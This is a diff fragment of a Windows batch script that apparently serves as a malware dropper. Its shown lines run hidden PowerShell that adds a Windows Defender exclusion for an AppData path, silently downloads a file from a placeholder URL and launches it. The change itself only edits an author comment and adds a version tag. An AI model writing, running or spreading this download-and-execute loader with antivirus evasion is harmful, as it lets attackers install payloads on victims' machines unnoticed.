@@ -11,4 +11,5 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDA
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 exit
-:: Made by GLICHED
+:: Made by GLICHED 
+:: v2
